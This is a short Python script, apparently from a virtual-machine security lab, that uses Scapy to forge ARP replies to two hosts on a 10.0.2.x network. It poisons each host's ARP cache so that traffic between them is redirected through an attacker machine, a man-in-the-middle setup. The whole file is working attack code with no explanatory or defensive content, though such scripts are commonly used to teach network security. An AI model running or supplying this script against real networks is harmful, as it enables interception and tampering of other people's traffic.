#!/usr/bin/python
from scapy.all import *
import re
VM_B_IP = '10.0.2.14'
VM_A_IP = '10.0.2.13'
VM_B_MAC = '08:00:27:7b:88:b1'
VM_A_MAC = '08:00:27:70:0c:00'
ATTACKER_IP = '10.0.2.8'
ATTACKER_MAC = '08:00:27:17:de:fa'
def arp_poison(vic1_ip, vic1_mac, vic2_ip, vic2_mac, attacker_ip, attacker_mac):
    E1= Ether()
    A1 = ARP(hwsrc=ATTACKER_MAC, psrc =VM_B_IP, hwdst=VM_A_MAC, pdst =VM_A_IP)
    pkt1 = E1/A1
    sendp(pkt1)
    E2= Ether()
    A2 = ARP(hwsrc=ATTACKER_MAC, psrc =VM_A_IP, hwdst=VM_B_MAC, pdst =VM_B_IP)
    pkt2 = E2/A2
    sendp(pkt2)
arp_poison(VM_A_IP, VM_A_MAC, VM_B_IP, VM_B_MAC, ATTACKER_IP, ATTACKER_MAC)